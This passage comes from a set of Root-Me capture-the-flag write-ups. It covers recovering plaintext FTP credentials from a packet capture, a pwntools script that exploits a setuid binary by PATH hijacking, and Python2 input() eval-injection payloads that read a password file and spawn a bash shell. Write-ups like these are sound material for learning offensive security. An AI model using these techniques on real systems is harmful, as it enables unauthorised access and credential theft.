   96  47.763900 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=226 Ack=3103 Win=32648 Len=0 TSval=1657608500 TSecr=1657438000
   97  47.764010 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=226 Ack=3483 Win=32648 Len=0 TSval=1657608500 TSecr=1657438000
   98  49.806640 10.20.144.150 → 10.20.144.151 TN5250 81 TN5250 Data to Mainframe, End of Record
   99  49.806870 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=3483 Ack=241 Win=16384 Len=0 TSval=1657440000 TSecr=1657610500
  100  49.825890 10.20.144.151 → 10.20.144.150 TN5250 729 TN5250 Data from Mainframe, End of Record
  101  49.826140 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=241 Ack=4142 Win=32648 Len=0 TSval=1657610500 TSecr=1657440000
  102  53.784480 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [FIN, PSH, ACK] Seq=241 Ack=4142 Win=32648 Len=0 TSval=1657614500 TSecr=1657440000
  103  53.784750 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=4142 Ack=242 Win=16384 Len=0 TSval=1657444000 TSecr=1657614500
  104  53.791460 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [FIN, PSH, ACK] Seq=4142 Ack=242 Win=16384 Len=0 TSval=1657444000 TSecr=1657614500
    105  53.791680 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=242 Ack=4143 Win=32648 Len=0 TSval=1657614500 TSecr=1657444000
</code></pre>
</details>
<p>From the above, what we can see is;</p>
<div class="table-wrapper"><table><thead><tr><th>Direction</th><th>Source IP</th><th>Destination IP</th><th>Protocols Involved</th></tr></thead><tbody>
<tr><td>Client → Server</td><td>10.20.144.150</td><td>10.20.144.151</td><td>FTP, FTP-DATA, Telnet, TN5250</td></tr>
<tr><td>Server → Client</td><td>10.20.144.151</td><td>10.20.144.150</td><td>FTP responses, TN5250 replies</td></tr>
</tbody></table>
</div>
<p>And there we can see in packet <code>8</code> user <code>cdts3500</code>, is trying to login and in packet <code>11</code> there is password entered for the user <code>cdts3500</code> which is same as username <code>cdts3500</code>.</p>
<pre><code class="language-bash">    8   4.216600 10.20.144.150 → 10.20.144.151 FTP 81 Request: USER cdts3500
    9   4.217350 10.20.144.151 → 10.20.144.150 FTP 91 Response: 331 Enter password.
   10   4.217630 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=16 Ack=114 Win=32648 Len=0 TSval=1657564500 TSecr=1657394000
   11   7.639420 10.20.144.150 → 10.20.144.151 FTP 81 Request: PASS cdts3500
</code></pre>
<p>There I confirmed the passoword is <code>cdts3500</code>, I submitted it and solved the challenge.</p>
<div style="break-before: page; page-break-before: always;"></div><p>!&gt; [!NOTE]</p>
<blockquote>
<p>Here you can find some of mostly solved challenges, as part of the root-me rules, I'm unable to add all the writeups. If you need any guidance, you may also ping me over <a href="https://discord.com/users/936853051984199750">Disocrd</a></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bash---system-1"><a class="header" href="#bash---system-1">Bash - System 1</a></h1>
<h2 id="statement-1"><a class="header" href="#statement-1">Statement</a></h2>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
</code></pre>
<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
<pre><code class="language-python">from pwn import *

s = ssh(host='challenge02.root-me.org' , user='app-script-ch11', password='app-script-ch11', port=2222)
log.success("SSH connection established.")
p = s.shell()

p.sendline(b"cp /bin/cat /tmp/ls")
p.sendline(b"PATH=/tmp:$PATH ./ch11")
p.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python---input"><a class="header" href="#python---input">Python - input()</a></h1>
<h2 id="statement-2"><a class="header" href="#statement-2">Statement</a></h2>
<p>Get the password in the .passwd file by exploiting a vulnerability in this python script.</p>
<hr />
<h1 id="analysis"><a class="header" href="#analysis">Analysis</a></h1>
<p>The give code has an vulnerability over python <code>input()</code> function, due to which I was able to crack the program and got the rce.</p>
<pre><code class="language-python">
#!/usr/bin/python2
     
import sys
     
def youLose():
    print "Try again ;-)"
    sys.exit(1)
       
 try:
     p = input("Please enter password : ")
except:
     youLose()
      
with open(".passwd") as f:
     passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()

</code></pre>
<p>The flow :</p>
<blockquote>
<p>Prompts the user for a password input, reads the real password from the <code>.passwd</code> file, compares the input against the stored password. Importantly, the program usage <code>python2</code></p>
</blockquote>
<h3 id="vulnerability"><a class="header" href="#vulnerability">Vulnerability:</a></h3>
<p>Since the program using <code>python2</code> rather then <code>python3</code>, the <code>input()</code> behaves fundamentally different.</p>
<div class="table-wrapper"><table><thead><tr><th>Version</th><th>how <code>input()</code> works.</th></tr></thead><tbody>
<tr><td>2</td><td>Evaluates the input as python code <code>eval(raw_input())</code></td></tr>
<tr><td>3</td><td>Reads input as a plain string</td></tr>
</tbody></table>
</div>
<h3 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h3>
<p>Let's try some payloads to get the rce.
<code>1==1</code>, this evaluates to <code>True</code>, but the check is <code>p == int(passwd)</code> so, it won't work as far.</p>
<p><img src="https://raw.githubusercontent.com/pwnspirit/files/main/notes/ch6/common-payload.png" alt="common-payload" /></p>
<p>Another try.</p>
<pre><code class="language-python">__import__('os').system('whoami')
# Since, `input()` calls `eval()`, we can run arbitrary python code.

__import__('os'),system('cat .passwd') # Directly cat the `.passwd`
</code></pre>
<p><img src="https://raw.githubusercontent.com/pwnspirit/files/main/notes/ch6/cracked.png" alt="cracked" /></p>
<p>Getting shell</p>
<pre><code class="language-python2">__import__('os').system('/bin/bash') # spawns the shell with /bin/bash
</code></pre>
<p><img src="https://raw.githubusercontent.com/pwnspirit/files/main/notes/ch6/rce.png" alt="rce" /></p>
<hr />
<p>Resources:</p>
<ul>
<li><a href="https://vickieli.dev/hacking/hack-python/">https://vickieli.dev/hacking/hack-python/</a></li>
<li><a href="https://github.com/pwnspirit/files/tree/main/notes/ch6">https://github.com/pwnspirit/files/tree/main/notes/ch6</a></li>
<li><a href="https://ctf.pwnspirit.xyz/rootme/APP_Script/python-input.html">https://ctf.pwnspirit.xyz/rootme/APP_Script/python-input.html</a></li>
</ul>
<hr />

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
